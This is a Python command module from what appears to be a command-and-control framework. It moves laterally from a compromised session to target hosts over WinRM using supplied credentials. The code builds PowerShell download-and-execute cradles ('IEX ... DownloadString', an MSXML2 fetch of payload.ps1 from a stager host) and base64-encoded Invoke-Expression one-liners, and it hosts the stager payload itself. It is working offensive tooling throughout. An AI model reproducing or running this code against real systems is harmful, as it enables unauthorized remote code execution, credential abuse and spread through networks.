import sys
import os
import subprocess
import base64
import argparse

from core.gunnershell.commands.base import register, Command
from core import stager_server as stage
from core.session_handlers import session_manager

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred   = "\001" + Style.BRIGHT + Fore.RED + "\002"

@register("winrm")
class WinrmCommand(Command):
	"""Execute WinRM on the target host"""

	@property
	def help(self):
		return "winrm -u <user> -p <pass> [flags]    Execute command via WinRM"

	def execute(self, args):
		"""
		winrm -u <username> -p <password> [-d <domain>] [-dc <dc_host>] [--dc-ip <dc_ip>] [--local-auth] -i <target_ip>
		Establish a WinRM session to the target host using the specified credentials.
		"""
		parser = argparse.ArgumentParser(prog="winrm", add_help=False)
		parser.add_argument('-u',   dest='username',   required=True,  help='Username for authentication')
		parser.add_argument('-p',   dest='password',   required=True,  help='Password for authentication')
		parser.add_argument('-d',   dest='domain',     help='AD domain for authentication')
		parser.add_argument('-dc',  dest='dc_host',    help='Hostname of the Domain Controller')
		parser.add_argument('--dc-ip',     dest='dc_ip',       help='IP of the Domain Controller')
		parser.add_argument('--local-auth',action='store_true', dest='local_auth', help='Authenticate locally instead of AD domain')
		parser.add_argument('-i',   dest='target_ip',  required=True,  help='Target IP for WinRM')
		parser.add_argument('-c', '--command',   dest='command', help='Command to run on remote host')
		parser.add_argument('--exec-url',    dest='exec_url',  help='URL of remote PowerShell script to execute')
		parser.add_argument('--script',      dest='script_path', help='Path to local PowerShell script to encode & run')
		parser.add_argument('--debug',       action='store_true', dest='debug', help='Enable verbose WinRM output')
		parser.add_argument('--stager',      action='store_true', dest='stager', help='Download & execute payload.ps1 from C2 instead of --command')
		parser.add_argument('--stager-port', dest='stager_port', type=int, default=8000, help='Port for HTTP stager (default:8000)')
		parser.add_argument('--stager-ip',   dest='stager_ip', help='IP to fetch stager payload from')

		try:
			opts = parser.parse_args(args)
		except SystemExit:
			# argparse already printed its usage; print our colored help too
			print(brightyellow + self.help)
			return


		out = self.logic(
			self.gs.sid,
			self.gs.os_type,
			opts.username,
			opts.password,
			stage_ip = opts.stager_ip,
			domain = opts.domain,
			dc_host = opts.dc_host,
			dc_ip = opts.dc_ip,
			local_auth = opts.local_auth,
			target_ip = opts.target_ip,
			command = opts.command,
			debug = opts.debug,
			exec_url = opts.exec_url,
			script_path = opts.script_path,
			stager   = opts.stager,
			stage_port = opts.stager_port,
			op_id=self.op_id
		)

		if out:
			print(brightgreen + out)

		else:
			print(brightyellow + "[*] No output")



	def logic(self, sid, os_type, username, password, stage_ip, domain=None, dc_host=None, dc_ip=None, local_auth=False,
		target_ip=None, command=None, debug=None, exec_url=None, script_path=None, stager=False, stage_port=8000, op_id="console"):
		# Validate session
		sess = session_manager.sessions.get(sid)
		transport = sess.transport.lower()

		if not sess:
			return brightred + f"[!] No such session"

		display = next((alias for alias, rsid in session_manager.alias_map.items() if rsid == sid), sid)

		# Build user principal
		if local_auth:
			hostname_cmd = "hostname"

			if transport in ("tcp", "tls"):
				hostname = tcp_exec.run_command_tcp(sid, hostname_cmd, timeout=0.5, portscan_active=True, op_id=op_id)

			elif transport in ("http", "https"):
				hostname = http_exec.run_command_http(sid, hostname_cmd, op_id=op_id)

			if hostname:
				print(brightyellow + f"[*] Authenticating to {target_ip} as {hostname}\\{username}...")
				user_principal = f"{hostname}\\{username}"

			else:
				print(brightred + f"[!] Failed to grab hostname from agent {display}")

		else:
			if domain and dc_ip:
				print(brightyellow + f"[*] Authenticating to {target_ip} as {domain}\\{username}...")
				user_principal = f"{domain}\\{username}"

			else:
				if not domain:
					print(brightyellow + f"[*] The -d flag is required if you don't use --local-auth")
					return "FLAG ERROR"

				elif not dc_ip:
					print(brightyellow + f"[*] The --dc-ip flag is required if you don't use --local-auth")
					return "FLAG ERROR"

				elif not dc_ip and not domain:
					print(brightyellow + f"[*] Both the -d and --dc-ip flags are required if you don't use --local-auth")
					return "FLAG ERROR"

		if local_auth and (domain or dc_ip or dc_host):
			print(brightyellow + f"[*] You cannot use the --local-auth flag with any of the domain flags!")
			return "FLAG ERROR"

		if command and (exec_url or script_path):
			print(brightyellow + f"[*] You cannot use the --command flag with the --exec-url or the --script flag!")
			return "FLAG ERROR"

		if exec_url and script_path:
			print(brightyellow + f"[*] You cannot use the --exec-url and the --script flag at once!")
			return "FLAG ERROR"

		if not command:
			print(brightred + f"[*] You must specify a command with --command")
			return "FLAG ERROR"

		if exec_url:
			cmd = f"IEX (New-Object Net.WebClient).DownloadString('{exec_url}')"

		elif script_path:
			if not os.path.exists(script_path):
				print(brightred + f"[!] Script path does not exist: {script_path}")
				return "FILE ERROR"

			with open(script_path, 'r', encoding='utf-8') as f:
				script_content = f.read()

			encoded_script = base64.b64encode(script_content.encode('utf-8')).decode('utf-8')
			cmd = f"$s=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{encoded_script}')); IEX $s"

		if not exec_url and not script_path:
			if command is not None:
				cmd = command

			else:
				cmd = "whoami"

		# Construct PowerShell WinRM command
		if cmd:
			ps_cmd = f"""

$T = '{target_ip}'
try {{
		$nb = ([System.Net.Dns]::GetHostEntry($T).HostName.Split('.')[0])
	}} catch {{
		$nb = $T
	}}

$secpass = ConvertTo-SecureString '{password}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('{user_principal}', $secpass)
Invoke-Command -ComputerName $nb -Credential $cred -ScriptBlock {{ {cmd} }}
"""

		else:
			print(brightred + f"[!] Unable to execute command on remote host {target_ip}")

		# Optionally include DC targeting logic (stubbed; extend as needed)
		if dc_host or dc_ip:
			ps_cmd = (
				f"$sessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck; "
				+ ps_cmd
			)

		transport = sess.transport.lower()
		out = None

		if stager:
			u = f"http://{stage_ip}:{stage_port}/payload.ps1"
			ps = (
				f"$u='{u}';"
				"$xml=New-Object -ComObject 'MSXML2.ServerXMLHTTP.6.0';"
				"$xml.open('GET',$u,$false);"
				"$xml.send();"
				"IEX $xml.responseText"
			)

			b64 = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
			one_liner = (
        		"$ps = [System.Text.Encoding]::Unicode"
        		f".GetString([Convert]::FromBase64String(\"{b64}\")); "
        		"Invoke-Expression $ps"
    		)

			stage.start_stager_server(stage_port, one_liner)

			if transport in ("http", "https"):
				out = http_exec.run_command_http(sid, ps, op_id=op_id)

			elif transport in ("tcp", "tls"):
				out = tcp_exec.run_command_tcp(sid, ps, timeout=0.5, portscan_active=True, op_id=op_id)

			else:
				return brightred + "[!] Unknown session transport!"

		else:
			b64 = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
			one_liner = (
        		"$ps = [System.Text.Encoding]::Unicode"
        		f".GetString([Convert]::FromBase64String(\"{b64}\")); "
        		"Invoke-Expression $ps"
    		)
			if transport in ("http", "https"):
				out = http_exec.run_command_http(sid, one_liner, op_id=op_id)

			elif transport in ("tcp", "tls"):
				out = tcp_exec.run_command_tcp(sid, one_liner, timeout=4, portscan_active=True, op_id=op_id)

			else:
				print(brightred + f"[!] Unsupported session transport!")
				return None

		if out is not None:
			if "Access is denied" in out:
				if not debug and local_auth:
					return "ACCESS DENIED LOCAL AUTH"

				elif not debug and not local_auth:
					return "ACCESS DENIED"

				else:
					return out

		return out or ""